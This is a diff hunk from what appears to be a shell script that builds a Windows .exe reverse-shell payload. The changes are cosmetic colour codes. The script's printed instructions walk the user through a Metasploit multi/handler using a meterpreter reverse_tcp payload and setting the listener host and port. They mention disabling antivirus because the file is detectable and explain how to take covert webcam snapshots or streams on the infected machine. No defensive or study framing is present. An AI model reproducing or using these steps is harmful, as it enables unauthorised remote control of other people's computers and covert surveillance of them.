@@ -15,18 +15,22 @@ but, the .exe file is very detectable, so don't forget to disable the antivurus 
     echo ""
     echo "Once you've finished and launched the .exe on a Windows computer, use those commands on metasploit :"
     echo ""
+    tput setaf 1
     echo "use exploit/multi/handler"
     echo ""
     echo "set payload windows/x64/meterpreter/reverse_tcp"
     echo ""
+    tput setaf 7
     echo "One that's done, you have to type by yourself the lhost and lport, with the port and ip address that you wrote on the .exe file (port : $lport, ip : $lhost)"
     echo ""
     echo "Use this commands :"
     echo ""
+    tput setaf 1
     echo "set lhost $lhost"
     echo ""
     echo "set lport $lport"
     echo ""
+    tput setaf 7
     echo "Once all of this is done, you just have to lauch the exploit by typing run or exploit and that's it, to take a pic with the webcam, type webcam_snap, and if you want to record the webcam, type webcam_stream, for others commands, type help"
     echo ""
     sudo service postgresql start
